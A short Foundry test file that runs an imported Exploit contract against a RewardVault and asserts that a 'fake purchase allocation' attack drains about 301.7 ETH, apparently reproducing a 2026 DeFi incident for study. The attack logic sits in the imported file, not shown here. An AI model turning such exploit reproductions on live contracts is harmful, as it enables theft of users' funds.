// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, RewardVault, MiniERC20} from "./2026-07-ProjektRewardVault.sol";

contract ProjektRewardVaultTest is Test {
    function test_exploit_fakePurchaseAllocation_drainsEthPool() public {
        Exploit e = new Exploit();
        e.run();
        emit log_named_decimal_uint("ETH(WETH) drained from vault", e.drained(), 18);
        emit log_named_decimal_uint("attacker profit", e.profit(), 18);
        assertEq(e.profit(), 301704680000000000000, "must drain 301.70468 ETH");
    }
}
